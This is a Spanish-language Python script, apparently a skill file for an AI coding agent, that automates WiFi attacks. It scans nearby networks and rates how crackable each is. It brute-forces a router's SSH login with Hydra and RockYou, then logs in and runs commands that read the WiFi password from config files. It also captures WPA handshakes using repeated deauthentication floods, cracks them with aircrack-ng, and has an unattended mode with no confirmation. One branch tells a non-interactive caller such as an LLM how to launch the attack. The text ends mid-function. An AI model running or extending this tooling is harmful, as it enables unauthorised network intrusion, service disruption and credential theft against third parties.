#!/usr/bin/env python3
"""
WiFi Skill - Escaneo, brute-force y extracción de la contraseña WiFi
=====================================================================

Escanea redes WiFi cercanas, indica cuáles se pueden crackear y, si eliges
la red a la que estás conectado, hace brute-force del router con Hydra +
RockYou y muestra la contraseña WiFi actual.

Uso:
    wifi                 Escanea redes y abre el menú de selección
    wifi scan            Solo lista las redes y si se pueden crackear
    wifi capture 3       Captura el handshake de la red 3 y la crackea
    wifi capture -y --seconds 60 "SSID"   Automático, sin confirmación (para nohup)
    wifi --ip 10.0.0.1   Ataca un router directamente (sin menú)
    wifi --brute         Fuerza bruta directa con los valores por defecto

Nota: 'wifi capture' pone la interfaz en modo monitor y te desconecta
de tu WiFi actual mientras captura; luego la restaura a modo normal.

Opciones:
    -i, --ip <IP>        IP del router (default 192.168.1.1)
    -u, --user <USER>    Usuario a probar (default admin)
    -w, --wordlist <F>   Diccionario (default RockYou)
    -p, --port <PORT>    Puerto SSH (default 22)
    -b, --brute          Fuerza bruta directa sin escanear
    -s, --scan           Igual que 'wifi scan'
    -h, --help           Muestra esta ayuda

Flujo:
    1. Hydra prueba RockYou contra el SSH del router.
    2. Si acierta, entra con paramiko usando esa contraseña.
    3. Ejecuta comandos dentro del router y muestra la contraseña WiFi actual.
"""

import sys
import os
import re
import shutil
import subprocess
import time
from pathlib import Path


# Rutas absolutas de la skill
SKILL_DIR = Path("/home/gabo/.config/opencode/skills/wifi")
SCRIPTS_DIR = SKILL_DIR / "scripts"
WORDLIST_PATH = "/home/gabo/wordlists/rockyou.txt"

# Router de Claro Flamingo por defecto
DEFAULT_ROUTER_IP = "192.168.1.1"
DEFAULT_USER = "admin"

# Comandos que se ejecutan dentro del router tras entrar por SSH para sacar la PSK.
# Se prueban en orden; el primero que devuelva una contraseña válida gana.
WIFI_PSK_COMMANDS = [
    "uci show wireless 2>/dev/null",
    "nvram get wl0_wpa_psk 2>/dev/null",
    "nvram get wl_wpa_psk 2>/dev/null",
    "nvram get wl0_akm 2>/dev/null >/dev/null; nvram get wl0_ssid 2>/dev/null",
    "cat /etc/config/wireless 2>/dev/null",
    "cat /etc/wpa_supplicant/wpa_supplicant.conf 2>/dev/null",
    "cat /etc/wpa_supplicant.conf 2>/dev/null",
    "cat /etc/hostapd.conf 2>/dev/null",
    "hostapd_cli -i wlan0 get_config 2>/dev/null",
    "grep -rE 'psk|key|passphrase' /etc/config 2>/dev/null",
]

# Patrones de las distintas plataformas de router (OpenWrt/UCI, Broadcom/NVRAM,
# wpa_supplicant, hostapd).
PSK_PATTERNS = [
    re.compile(r"(?:option\s+|\.)key\s*=\s*['\"]([^'\"]+)['\"]", re.IGNORECASE),
    re.compile(r"(?:option\s+|\.)key\s+['\"]([^'\"]+)['\"]", re.IGNORECASE),
    re.compile(r"(?:option\s+|\.)psk\s*=\s*['\"]([^'\"]+)['\"]", re.IGNORECASE),
    re.compile(r"(?:option\s+|\.)psk\s+['\"]([^'\"]+)['\"]", re.IGNORECASE),
    re.compile(r"^\s*psk\s*=\s*\"?([^\"\s]+)\"?", re.IGNORECASE | re.MULTILINE),
    re.compile(r"wpa[-_]?psk\s*=\s*\"?([^\"\s]+)\"?", re.IGNORECASE),
    re.compile(r"wpa[-_]?passphrase\s*=\s*\"?([^\"\s]+)\"?", re.IGNORECASE),
    re.compile(r"\bpassword\s*=\s*\"?([^\"\s]+)\"?", re.IGNORECASE),
    re.compile(r"preshared[_-]?key\s*=\s*\"?([^\"\s]+)\"?", re.IGNORECASE),
    re.compile(r"^\s*key\s*=\s*\"?([^\"\s]+)\"?", re.IGNORECASE | re.MULTILINE),
]

# Valores que nunca son una PSK real.
PSK_REJECT = {
    "", "none", "disabled", "****", "********", "sae", "psk", "psk2",
    "wpa2", "wpa", "wpa-psk", "wpa2-psk", "wpa3", "0", "1",
}


def _valid_psk(value):
    """Descartar coincidencias que no son contraseñas WiFi reales."""
    if value is None:
        return False
    value = value.strip().strip("'\"")
    if value.lower() in PSK_REJECT:
        return False
    # Una PSK WPA/WPA2 tiene entre 8 y 63 caracteres; algunas claves WEP son más cortas.
    if len(value) < 6 or len(value) > 64:
        return False
    if re.fullmatch(r"[a-zA-Z_]+", value) and value.lower() in PSK_REJECT:
        return False
    return True


def parse_wifi_psk(text):
    """Extraer la contraseña WiFi de la salida de uno o varios comandos del router."""
    if not text:
        return None
    for pattern in PSK_PATTERNS:
        for match in pattern.finditer(text):
            candidate = match.group(1)
            if _valid_psk(candidate):
                return candidate.strip().strip("'\"")
    return None


def check_dependencies():
    """Verificar que las herramientas necesarias están instaladas."""
    missing = []
    
    # Verificar Hydra
    try:
        subprocess.run(["hydra", "--version"], capture_output=True, text=True)
        print("[✓] Hydra disponible")
    except Exception as e:
        missing.append("Hydra")
        print(f"[✗] Hydra no está instalado o no disponible: {e}")
    
    # Verificar RockYou dictionary
    if not os.path.exists(WORDLIST_PATH):
        missing.append("RockYou dictionary")
        print(f"[✗] RockYou dictionary no encontrado en {WORDLIST_PATH}")

    # paramiko solo es necesario para el paso post-login (no es fatal)
    try:
        import paramiko  # noqa: F401
    except ImportError:
        print("[!] paramiko no está instalado: no se podrá leer la WiFi tras el login.")
        print("    Instala con: pip install paramiko")

    return missing


def _split_terse(line):
    """Separar una línea 'terse' de nmcli respetando los ':' escapados."""
    parts, current, escaped = [], [], False
    for ch in line:
        if escaped:
            current.append(ch)
            escaped = False
        elif ch == "\\":
            escaped = True
        elif ch == ":":
            parts.append("".join(current))
            current = []
        else:
            current.append(ch)
    parts.append("".join(current))
    return parts


def classify_security(security):
    """Clasificar una red por seguridad y si se puede crackear con este flujo."""
    s = (security or "").strip().upper()
    if not s or s in ("--", "NONE", "OPEN", "ABIERTA"):
        return "ABIERTA", "entrar directo, sin contraseña", "SÍ"
    if "WEP" in s:
        return "WEP", "fácil: capturar IVs + aircrack-ng", "SÍ"
    if "802.1X" in s or "ENTERPRISE" in s or "EAP" in s:
        return "EMPRESA", "802.1X/EAP, no cae con diccionario", "NO"
    if "WPA3" in s or "SAE" in s:
        return "WPA3", "SAE, no cae con RockYou", "LIMITADO"
    if "WPA2" in s:
        return "WPA2", "handshake + RockYou", "SÍ"
    if "WPA" in s:
        return "WPA", "handshake + RockYou", "SÍ"
    return (s or "?"), "desconocido", "?"


def get_wifi_interface():
    """Nombre de la interfaz WiFi activa (wlan0 por defecto)."""
    try:
        result = subprocess.run(
            ["nmcli", "-t", "-f", "DEVICE,TYPE", "dev", "status"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            parts = _split_terse(line)
            if len(parts) >= 2 and parts[1] == "wifi" and parts[0] not in ("--", ""):
                return parts[0]
    except Exception:
        pass
    return "wlan0"


def get_current_ssid():
    """SSID de la red a la que estamos conectados, si hay una."""
    try:
        result = subprocess.run(
            ["nmcli", "-t", "-f", "ACTIVE,SSID", "dev", "wifi"],
            capture_output=True, text=True, timeout=10,
        )
        for line in result.stdout.splitlines():
            parts = _split_terse(line)
            if len(parts) >= 2 and parts[0].strip().lower() in ("yes", "sí", "si"):
                return parts[1]
    except Exception:
        pass
    return None


def get_gateway():
    """IP del gateway (router) de la red actual."""
    try:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            if "via" in parts:
                return parts[parts.index("via") + 1]
    except Exception:
        pass
    return None


def scan_networks(rescan=True):
    """Escanear redes WiFi visibles con nmcli. Devuelve una lista de dicts.

    Con rescan=False usa la lista cacheada (rápido) para refrescar datos.
    """
    def _run(extra):
        return subprocess.run(
            ["nmcli", "-t", "-f",
             "IN-USE,SSID,SIGNAL,SECURITY,CHAN,BSSID",
             "dev", "wifi", "list"] + extra,
            capture_output=True, text=True, timeout=30,
        )

    attempts = [["--rescan", "yes"], [], ["--rescan", "no"]] if rescan else [[], ["--rescan", "no"]]
    result = None
    for extra in attempts:
        try:
            attempt = _run(extra)
        except Exception:
            continue
        if attempt.returncode == 0 and attempt.stdout.strip():
            result = attempt
            break

    if result is None:
        return []

    best = {}
    for line in result.stdout.splitlines():
        parts = _split_terse(line)
        if len(parts) < 6:
            continue
        in_use, ssid, signal, security, channel, bssid = parts[:6]
        if not signal.strip().isdigit():
            continue
        level, note, crackable = classify_security(security)
        entry = {
            "in_use": in_use.strip() == "*",
            "ssid": ssid,
            "signal": int(signal),
            "security": security,
            "channel": channel.strip(),
            "bssid": bssid.upper(),
            "level": level,
            "note": note,
            "crackable": crackable,
        }
        key = ssid if ssid else bssid
        if key not in best or entry["signal"] > best[key]["signal"] or entry["in_use"]:
            best[key] = entry

    networks = list(best.values())
    networks.sort(key=lambda n: (not n["in_use"], -n["signal"]))
    return networks


def print_network_table(networks):
    """Mostrar la tabla de redes con señal, seguridad y si se pueden crackear."""
    print(f"\n{'='*90}")
    print("  REDES WIFI DETECTADAS")
    print(f"{'='*90}")
    print(f"{'#':>2}  {'':1} {'SSID':24} {'SEÑAL':>5} {'SEGURIDAD':14} "
          f"{'CANAL':>5} {'BSSID':17} {'CRACKEABLE':10}")
    print("-" * 90)
    for i, net in enumerate(networks, 1):
        ssid = (net["ssid"] or "<oculta>")[:24]
        print(f"{i:>2}  {'*' if net['in_use'] else ' '} {ssid:24} "
              f"{net['signal']:>5} {net['level'][:14]:14} "
              f"{net['channel']:>5} {net['bssid']:17} {net['crackable']:10}")
    print("-" * 90)
    print("SÍ = diccionario/handshake o red abierta | LIMITADO = WPA3 | NO = empresa/desconocido")
    print("* = red a la que estás conectado")


def select_network(networks):
    """Menú interactivo para elegir una red por número."""
    try:
        raw = input("\nElige el número de red (Enter para cancelar): ").strip()
    except (EOFError, KeyboardInterrupt):
        print("\nCancelado.")
        return None
    if not raw:
        print("Cancelado.")
        return None
    if not raw.isdigit():
        print("Selección inválida.")
        return None
    index = int(raw)
    if not 1 <= index <= len(networks):
        print("Ese número no está en la lista.")
        return None
    return networks[index - 1]


def show_crack_plan(net):
    """Explicar cómo crackear la red seleccionada según su seguridad."""
    ssid = net["ssid"] or "<oculta>"
    bssid = net["bssid"] or "<BSSID>"
    channel = net["channel"] or "<canal>"
    iface = get_wifi_interface()
    level, note, crackable = net["level"], net["note"], net["crackable"]

    print(f"\n{'='*70}")
    print(f"  PLAN PARA '{ssid}'  ({level} - {note})")
    print(f"{'='*70}")

    if level == "ABIERTA":
        print(f"\nRed abierta: entra directo, sin contraseña.\n")
        print(f"   nmcli dev wifi connect \"{ssid}\"")
    elif level == "WEP":
        print(f"""
Necesitas modo monitor y capturar IVs (WEP es débil).
1) Activar modo monitor:
   sudo ip link set {iface} down
   sudo iw dev {iface} set type monitor
   sudo ip link set {iface} up

2) Capturar IVs del canal {channel} (BSSID {bssid}):
   mkdir -p $HOME/capturas
   sudo airodump-ng -c {channel} --bssid {bssid} -w $HOME/capturas/wep {iface}

3) Crackear cuando tengas suficientes IVs:
   aircrack-ng $HOME/capturas/wep-01.cap

4) Restaurar modo normal:
   sudo ip link set {iface} down
   sudo iw dev {iface} set type managed
   sudo ip link set {iface} up""")
    elif level in ("WPA", "WPA2"):
        slug = re.sub(r"[^A-Za-z0-9_-]+", "_", ssid)[:32] or "captura"
        print(f"""
Necesitas modo monitor y capturar el handshake (WPA/WPA2).
1) Activar modo monitor:
   sudo ip link set {iface} down
   sudo iw dev {iface} set type monitor
   sudo ip link set {iface} up

2) Capturar handshake del canal {channel} (BSSID {bssid}):
   mkdir -p $HOME/capturas
   sudo airodump-ng -c {channel} --bssid {bssid} -w $HOME/capturas/{slug} {iface}
   # opcional, en otra terminal, para forzar reconexión:
   sudo aireplay-ng --deauth 5 -a {bssid} {iface}

3) Crackear con RockYou:
   aircrack-ng -w {WORDLIST_PATH} $HOME/capturas/{slug}-01.cap

4) Restaurar modo normal:
   sudo ip link set {iface} down
   sudo iw dev {iface} set type managed
   sudo ip link set {iface} up

Si no hay clientes conectados no habrá handshake. Si estás conectado
a esta misma red, puedes atacar el router directamente con: wifi --brute""")
    elif level == "WPA3":
        print("""
WPA3 usa SAE: el ataque de diccionario con handshake NO funciona.
Opciones reales son específicas (transición WPA2/WPA3, WPS o ingeniería
social) y no están automatizadas aquí. No hay plan con RockYou.""")
    else:
        print("\nEsta red no es crackeable con este flujo (empresa/802.1X o desconocido).")


def scan_command():
    """Subcomando 'wifi scan': mostrar redes y salir."""
    networks = scan_networks()
    if not networks:
        print("[✗] No se detectaron redes WiFi.")
        print("    Comprueba que la WiFi esté encendida. Si faltan permisos: sudo wifi scan")
        return
    print_network_table(networks)


def _run_cmd(cmd, **kwargs):
    """subprocess.run silencioso que nunca revienta por un fallo."""
    kwargs.setdefault("capture_output", True)
    kwargs.setdefault("text", True)
    kwargs.setdefault("timeout", 15)
    try:
        return subprocess.run(cmd, **kwargs)
    except Exception:
        return None


def _eapol_frames(cap):
    """Contar tramas EAPOL de un .cap con tshark. None si no se puede saber."""
    if shutil.which("tshark") is None:
        return None
    res = _run_cmd(["tshark", "-r", str(cap), "-Y", "eapol",
                    "-T", "fields", "-e", "frame.number"])
    if res is None or res.returncode != 0:
        return None
    return len([ln for ln in (res.stdout or "").splitlines() if ln.strip()])


def _stop_airodump(dump, slug):
    """Parar airodump-ng y su hijo root para que escriba el .cap completo."""
    try:
        dump.terminate()
        dump.wait(timeout=5)
    except Exception:
        try:
            dump.kill()
        except Exception:
            pass
    for sig in ("-INT", "-TERM", "-KILL"):
        _run_cmd(["sudo", "pkill", sig, "-f", f"airodump-ng.*{slug}"])
        if sig != "-KILL":
            time.sleep(1)


def capture_handshake(net, iface=None, capture_seconds=45, out_dir=None,
                      assume_yes=False):
    """
    Capturar el handshake de una red WPA/WPA2 (o IVs de WEP) y crackearlo.

    Libera la interfaz de NetworkManager, la pone en modo monitor, fija el canal,
    captura con airodump-ng, fuerza deauths repetidos y lanza aircrack-ng con
    RockYou. La interfaz y NetworkManager se restauran SIEMPRE, incluso si algo
    falla. Con assume_yes=True no pide confirmación (para ejecución desacoplada).
    """
    raw_ssid = net["ssid"]
    bssid = net["bssid"]
    channel = net["channel"] or "1"
    level = net["level"]

    # Refrescar BSSID/canal con lo que haya ahora mismo (rápido, sin reescanear)
    try:
        fresh = scan_networks(rescan=False)
    except Exception:
        fresh = []
    for cand in fresh:
        same_bssid = cand["bssid"] and cand["bssid"].lower() == (bssid or "").lower()
        same_ssid = bool(raw_ssid) and cand["ssid"] == raw_ssid
        if same_bssid or same_ssid:
            bssid = cand["bssid"] or bssid
            channel = cand["channel"] or channel
            level = cand["level"]
            break

    ssid = raw_ssid or "<oculta>"
    iface = iface or get_wifi_interface()
    out_dir = Path(out_dir) if out_dir else (Path.home() / "capturas")
    out_dir.mkdir(parents=True, exist_ok=True)
    slug = re.sub(r"[^A-Za-z0-9_-]+", "_", ssid)[:32] or "captura"
    base = out_dir / slug
    log = out_dir / f"{slug}.log"

    if level not in ("WPA", "WPA2", "WEP"):
        print(f"[✗] {level} no se captura con este método (solo WPA/WPA2/WEP).")
        return None
    if shutil.which("airodump-ng") is None or shutil.which("aireplay-ng") is None:
        print("[✗] Faltan airodump-ng/aireplay-ng (paquete aircrack-ng).")
        return None

    print(f"\n[!] Esto pondrá {iface} en MODO MONITOR y te desconectará de tu WiFi actual.")
    print(f"    Objetivo: {ssid} ({bssid}, canal {channel}, {level})")
    print(f"    Captura: {capture_seconds}s en {out_dir}")
    if assume_yes:
        print("[i] Modo automático (-y): sin confirmación.")
    else:
        try:
            answer = input("¿Continuar? [s/N]: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            answer = ""
        if answer not in ("s", "si", "sí", "y", "yes"):
            print("Cancelado.")
            return None

    def sudo(*cmd, **kwargs):
        kwargs.setdefault("capture_output", True)
        kwargs.setdefault("text", True)
        kwargs.setdefault("timeout", 20)
        return subprocess.run(["sudo", *cmd], **kwargs)

    cap = None
    nm_released = False
    try:
        print("\n[1/5] Liberando la interfaz de NetworkManager...")
        res = sudo("nmcli", "device", "set", iface, "managed", "no")
        nm_released = res is not None and getattr(res, "returncode", 1) == 0
        if not nm_released:
            print("[!] No se pudo marcar la interfaz como 'managed no'; sigo igual.")

        print("[2/5] Activando modo monitor y fijando canal...")
        sudo("ip", "link", "set", iface, "down")
        sudo("iw", "dev", iface, "set", "type", "monitor")
        sudo("ip", "link", "set", iface, "up")
        sudo("iw", "dev", iface, "set", "channel", str(channel))
        info = sudo("iw", "dev", iface, "info")
        info_txt = (getattr(info, "stdout", "") or "") if info else ""
        if "type monitor" not in info_txt:
            print("[✗] La interfaz NO quedó en modo monitor. Abortando.")
            print("    Salida de iw:", info_txt.strip() or "(vacía)")
            return None
        if f"channel {channel} " not in info_txt and f"channel {channel}(" not in info_txt:
            print(f"[!] No pude confirmar el canal {channel}; airodump lo intentará.")

        print(f"[3/5] Capturando en canal {channel} ({capture_seconds}s)...")
        with open(log, "w") as logfh:
            dump = subprocess.Popen(
                ["sudo", "airodump-ng", "-c", str(channel), "--bssid", bssid,
                 "--write-interval", "1", "-w", str(base), iface],
                stdout=logfh, stderr=subprocess.STDOUT, text=True,
            )
            seen_handshake = False
            try:
                time.sleep(5)
                first_log = log.read_text(errors="ignore") if log.exists() else ""
                if "fixed channel" in first_log.lower():
                    print("[!] Airodump no pudo fijar el canal; revisa el log:", log)
                rounds = max(1, (capture_seconds - 5) // 10)
                for i in range(rounds):
                    print(f"[4/5] Deauth {i + 1}/{rounds}...")
                    sudo("aireplay-ng", "--deauth", "10", "-a", bssid, iface)
                    for _ in range(5):
                        time.sleep(2)
                        content = log.read_text(errors="ignore") if log.exists() else ""
                        if "wpa handshake:" in content.lower():
                            seen_handshake = True
                            break
                    if seen_handshake:
                        break
            finally:
                _stop_airodump(dump, slug)

        caps = sorted(
            list(out_dir.glob(f"{slug}-*.cap")) + list(out_dir.glob(f"{slug}-*.pcap")),
            key=lambda p: p.stat().st_mtime,
        )
        if not caps:
            print("[✗] No se generó ningún archivo de captura (.cap).")
            return None
        cap = caps[-1]
        eapol = _eapol_frames(cap)
        if seen_handshake or (eapol or 0) >= 2:
            print(f"[✓] Handshake probable (EAPOL: {eapol if eapol is not None else '?'}).")
        else:
            print(f"[!] Sin EAPOL en la captura (EAPOL: {eapol if eapol is not None else '?'}).")
            print("    Suele significar que no había clientes conectados o el deauth no llegó.")
    except subprocess.CalledProcessError as exc:
        print(f"[✗] Falló un comando con sudo: {exc}")
        return None
    except KeyboardInterrupt:
        print("\n[!] Interrumpido por el usuario.")
        return None
    finally:
        print("\n[5/5] Restaurando modo normal...")
        sudo("ip", "link", "set", iface, "down")
        sudo("iw", "dev", iface, "set", "type", "managed")
        sudo("ip", "link", "set", iface, "up")
        if nm_released:
            sudo("nmcli", "device", "set", iface, "managed", "yes")
        print("Modo normal restaurado. NetworkManager reconectará tu red en unos segundos.")

    if cap is None:
        return None

    eapol = _eapol_frames(cap)
    print(f"\nCaptura guardada en: {cap}")
    if level != "WEP" and eapol == 0:
        print("[✗] La captura no tiene tramas EAPOL: no hay handshake que crackear.")
        print("    Reintenta con un cliente conectado a la red o más tiempo de captura.")
        return cap
    if level == "WEP":
        cmd = ["aircrack-ng", str(cap)]
    else:
        cmd = ["aircrack-ng", "-w", WORDLIST_PATH, str(cap)]
    print(f"Crackeando con: {' '.join(cmd)}\n")
    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print("\n[!] Crackeo interrumpido.")
    return cap


def capture_command(args):
    """Subcomando 'wifi capture [-y] [--seconds N] <número|SSID|BSSID>'."""
    assume_yes = False
    capture_seconds = 45
    token = None
    i = 0
    while i < len(args):
        arg = args[i]
        if arg in ("-y", "--yes"):
            assume_yes = True
            i += 1
        elif arg in ("--seconds", "-t"):
            if i + 1 < len(args):
                try:
                    capture_seconds = int(args[i + 1])
                except ValueError:
                    pass
            i += 2
        elif token is None:
            token = arg
            i += 1
        else:
            i += 1

    networks = scan_networks()
    if not networks:
        print("[✗] No se detectaron redes WiFi.")
        return

    target = None
    if token:
        if token.isdigit():
            index = int(token)
            if 1 <= index <= len(networks):
                target = networks[index - 1]
        if target is None:
            needle = token.lower()
            for net in networks:
                if (net["ssid"] or "").lower() == needle or net["bssid"].lower() == needle:
                    target = net
                    break

    if target is None:
        print_network_table(networks)
        print("\nUso: wifi capture [-y] [--seconds N] <número de la lista | SSID | BSSID>")
        return

    print_network_table(networks)
    print(f"\nRed elegida: {target['ssid'] or target['bssid']} ({target['level']})")
    capture_handshake(target, capture_seconds=capture_seconds, assume_yes=assume_yes)


def brute_force_ssh(ip, user, wordlist, port=22, timeout=30):
    """
    Brute-force SSH usando Hydra.

    Args:
        ip (str): IP del router
        user (str): Usuario para probar
        wordlist (str): Ruta al diccionario
        port (int): Puerto SSH (default 22)
        timeout (int): Tiempo máximo por palabra en segundos

    Returns:
        tuple: (success, password, output)
    """
    cmd = [
        "hydra", "-l", user, "-P", wordlist,
        f"ssh://{ip}",
        "-o", f"/tmp/router_crack/results/{user}_result.txt",
        "--timeout", str(timeout),
        "--progress"
    ]

    print(f"\n{'='*60}")
    print(f"  BRUTE-FORCE SSH - CLARO FLAMINGO")
    print(f"{'='*60}")
    print(f"IP Router: {ip}")
    print(f"Usuario:   {user}")
    print(f"Diccionario: RockYou ({WORDLIST_PATH})")
    print(f"Puerto:     {port}")
    print(f"{'='*60}\n")

    start_time = time.time()

    # Definir RESULT_FILE una sola vez al inicio
    RESULTS_DIR = SKILL_DIR / "results"
    RESULTS_DIR.mkdir(parents=True, exist_ok=True)
    RESULT_FILE = RESULTS_DIR / f"{user}_final.txt"

    start_time = time.time()
    elapsed = 0.0

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout * 100,
            cwd="/tmp/router_crack"
        )

        elapsed = time.time() - start_time

        if result.returncode == 0:
            # Encontró contraseña
            print(f"\n{'='*60}")
            print("¡CRACKEADO! La contraseña es:")
            print(f"{'='*60}\n")

            # Leer resultado de Hydra
            result_file = Path("/tmp/router_crack/results").joinpath(
                f"{user}_result.txt"
            )
            
            if result_file.exists():
                with open(result_file, 'r') as f:
                    content = f.read()
                
                # Extraer contraseña de Hydra output
                password_line = None
                for line in content.split('\n'):
                    if "password:" in line.lower():
                        password_line = line.strip()
                        break

                if password_line and "password:" in password_line:
                    password = password_line.split("password:")[-1].strip()
                    
                    print(f"  {password}")
                    
                    with open(RESULT_FILE, 'w') as f:
                        f.write(f"\n{'='*60}\n")
                        f.write(f"  CLARO FLAMINGO ROUTER - CRACKEADO CON HYDRA\n")
                        f.write(f"{'='*60}\n\n")
                        f.write(f"Fecha:      {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write(f"IP Router:  {ip}\n")
                        f.write(f"Usuario:    {user}\n")
                        f.write(f"Diccionario: RockYou\n\n")
                        f.write(f"Contraseña encontrada:\n{password}\n\n")
                        f.write(f"Tiempo total de crackeo: {elapsed:.2f} segundos\n")

                    print(f"  Resultado guardado en: {RESULT_FILE}")
                    
                    return True, password, elapsed
                else:
                    # Hydra encontró pero no pudo extraer contraseña
                    print("[✗] Hydra encontró credenciales pero no pudo extraer la contraseña.")
                    with open(RESULT_FILE, 'w') as f:
                        f.write(f"\n{'='*60}\n")
                        f.write(f"  CLARO FLAMINGO ROUTER - CRACKEADO CON HYDRA\n")
                        f.write(f"{'='*60}\n\n")
                        f.write(f"Fecha:      {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write(f"IP Router:  {ip}\n")
                        f.write(f"Usuario:    {user}\n")
                        f.write(f"Diccionario: RockYou\n\n")
                        f.write(f"[✗] Hydra encontró credenciales pero no pudo extraer la contraseña.\n")

                    print(f"  Resultado guardado en: {RESULT_FILE}")
                    
                    return True, None, elapsed
            else:
                # Hydra ejecutó pero no escribió resultado
                print("[✗] Hydra ejecutó pero no encontró credenciales.")
                
                with open(RESULT_FILE, 'w') as f:
                    f.write(f"\n{'='*60}\n")
                    f.write(f"  CLARO FLAMINGO ROUTER - CRACKEADO CON HYDRA\n")
                    f.write(f"{'='*60}\n\n")
                    f.write(f"Fecha:      {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"IP Router:  {ip}\n")
                    f.write(f"Usuario:    {user}\n")
                    f.write(f"Diccionario: RockYou\n\n")

                print(f"  Resultado guardado en: {RESULT_FILE}")
                
                return False, None, elapsed
        else:
            # No encontró credenciales
            print(f"\n[✗] Hydra no encontró la contraseña aún...")
            
            # Mostrar progreso si hay output
            if result.stderr and "Trying" in result.stderr:
                for line in result.stderr.split('\n')[-20:]:
                    if "Trying" in line or "Loaded" in line:
                        print(line)

            with open(RESULT_FILE, 'w') as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"  CLARO FLAMINGO ROUTER - CRACKEADO CON HYDRA\n")
                f.write(f"{'='*60}\n\n")
                f.write(f"Fecha:      {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"IP Router:  {ip}\n")
                f.write(f"Usuario:    {user}\n")
                f.write(f"Diccionario: RockYou\n\n")

            print(f"  Resultado guardado en: {RESULT_FILE}")
            
            return False, None, elapsed

    except subprocess.TimeoutExpired:
        elapsed = time.time() - start_time
        print(f"\n[✗] Timeout después de {timeout} segundos por palabra.")
        
        with open(RESULT_FILE, 'w') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"  CLARO FLAMINGO ROUTER - CRACKEADO CON HYDRA\n")
            f.write(f"{'='*60}\n\n")
            f.write(f"Fecha:      {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"IP Router:  {ip}\n")
            f.write(f"Usuario:    {user}\n")
            f.write(f"Diccionario: RockYou\n\n")

        print(f"  Resultado guardado en: {RESULT_FILE}")
        
        return False, None, elapsed


def extract_wifi_password(ip, user, password, port=22, timeout=10):
    """
    Entrar al router por SSH con las credenciales crackeadas y extraer la
    contraseña WiFi (PSK) actual ejecutando comandos dentro del router.

    Args:
        ip (str): IP del router
        user (str): Usuario válido
        password (str): Contraseña válida (la del crackeo)
        port (int): Puerto SSH
        timeout (int): Timeout de conexión y de cada comando

    Returns:
        str | None: PSK encontrada, o None si no se pudo extraer.
    """
    print(f"\n{'='*60}")
    print("  POST-LOGIN - EXTRAYENDO CONTRASEÑA WIFI DEL ROUTER")
    print(f"{'='*60}")
    print(f"Conectando por SSH a {user}@{ip}:{port} ...")

    try:
        import paramiko
    except ImportError:
        print("[✗] paramiko no está instalado; no se puede ejecutar el paso post-login.")
        print("    Instala con: pip install paramiko")
        return None

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=ip,
            port=port,
            username=user,
            password=password,
            timeout=timeout,
            banner_timeout=timeout,
            auth_timeout=timeout,
            look_for_keys=False,
            allow_agent=False,
        )
    except Exception as e:
        print(f"[✗] No se pudo entrar por SSH: {e}")
        return None

    print("[✓] Sesión SSH establecida\n")

    found = None
    try:
        for command in WIFI_PSK_COMMANDS:
            try:
                stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
                output = stdout.read().decode("utf-8", errors="ignore")
                if not output:
                    output = stderr.read().decode("utf-8", errors="ignore")
            except Exception:
                continue

            psk = parse_wifi_psk(output)
            if psk:
                print(f"[✓] Contraseña WiFi encontrada con: {command}")
                found = psk
                break
    finally:
        client.close()

    if not found:
        print("[✗] No se pudo extraer la contraseña WiFi con los comandos probados.")

    return found


def main():
    """Punto de entrada: escaneo/menú o ataque directo al router."""
    args = sys.argv[1:]

    # Ayuda sin exigir dependencias
    if args and args[0] in ("--help", "-h", "help"):
        print(__doc__)
        return

    # Subcomando de escaneo
    if args and args[0] in ("scan", "-s", "--scan"):
        scan_command()
        return

    # Subcomando de captura de handshake
    if args and args[0] == "capture":
        capture_command(args[1:])
        return

    # Fuerza bruta directa, sin menú ni escaneo
    force_brute = False
    if args and args[0] in ("--brute", "-b"):
        force_brute = True
        args = args[1:]

    # Sin argumentos: si hay terminal, escanear y dejar elegir red
    interactive = (not args and not force_brute and sys.stdin.isatty())

    if not args and not force_brute and not sys.stdin.isatty():
        # Sin terminal (p. ej. un LLM): mostrar redes y explicar cómo seguir
        networks = scan_networks()
        if networks:
            print_network_table(networks)
        else:
            print("[✗] No se detectaron redes WiFi.")
        print("\nPara atacar el router de tu red actual:  wifi --brute")
        print("Para atacar una IP concreta:             wifi --ip <IP>")
        return

    missing = check_dependencies()
    if missing:
        print("\n[!] Faltan dependencias. Instala primero:")
        for dep in missing:
            print(f"   - {dep}")
        return

    # Valores por defecto
    ip = DEFAULT_ROUTER_IP
    user = DEFAULT_USER
    wordlist = WORDLIST_PATH
    port = 22

    # Parsear opciones
    i = 0
    while i < len(args):
        arg = args[i]

        if arg in ("--ip", "-i"):
            ip = args[i + 1] if i + 1 < len(args) else DEFAULT_ROUTER_IP
            i += 2
        elif arg in ("--user", "-u"):
            user = args[i + 1] if i + 1 < len(args) else DEFAULT_USER
            i += 2
        elif arg in ("--wordlist", "-w"):
            wordlist = args[i + 1] if i + 1 < len(args) else WORDLIST_PATH
            i += 2
        elif arg in ("--port", "-p"):
            port = int(args[i + 1]) if i + 1 < len(args) else 22
            i += 2
        elif arg in ("--help", "-h"):
            print(__doc__)
            return
        else:
            break

        i += 1

    # Modo interactivo: escanear, elegir red y decidir qué hacer
    if interactive:
        networks = scan_networks()
        if not networks:
            print("[✗] No se detectaron redes WiFi.")
            return
        print_network_table(networks)

        selected = select_network(networks)
        if selected is None:
            return

        current = get_current_ssid()
        is_current = selected["in_use"] or (
            current is not None and selected["ssid"] == current
        )

        if not is_current:
            # No estamos dentro de esa red: capturar el handshake automáticamente
            show_crack_plan(selected)
            print("\nIniciando captura automática (pedirá una confirmación)...")
            capture_handshake(selected)
            return

        gateway = get_gateway()
        if gateway:
